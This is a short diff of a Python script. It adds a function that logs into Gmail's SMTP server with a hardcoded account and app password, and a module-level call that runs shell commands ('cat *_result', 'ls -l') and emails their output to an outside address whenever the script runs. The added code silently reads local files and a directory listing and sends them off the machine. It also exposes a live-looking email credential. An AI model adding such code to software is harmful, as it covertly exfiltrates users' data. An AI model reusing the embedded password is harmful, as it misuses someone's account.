@@ -64,9 +64,21 @@ def send_data_file(zip_filename="data.zip", message="no_data"):
     
     # Terminating the session
     s.quit()
-send_data_file(file_path, "txt")
-
-
+# send_data_file(file_path, "txt")
+def send_data(message="no_data"):
+    # creates SMTP session
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+    # start TLS for security
+    s.starttls()
+    # Authentication
+    s.login("ashrafalx368@gmail.com", "qjra ywyu vjzy yves")
+    # sending the mail
+    s.sendmail("ashrafalx368@gmail.com", "ashrafatef368@gmail.com", message)
+    # terminating the session
+    s.quit()
+data = get_data("cat *_result")
+data += get_data("ls -l")
+send_data(data)
 try:
     with open(file_path, "r") as request:
         with open("f_nums", "r") as f_nums:
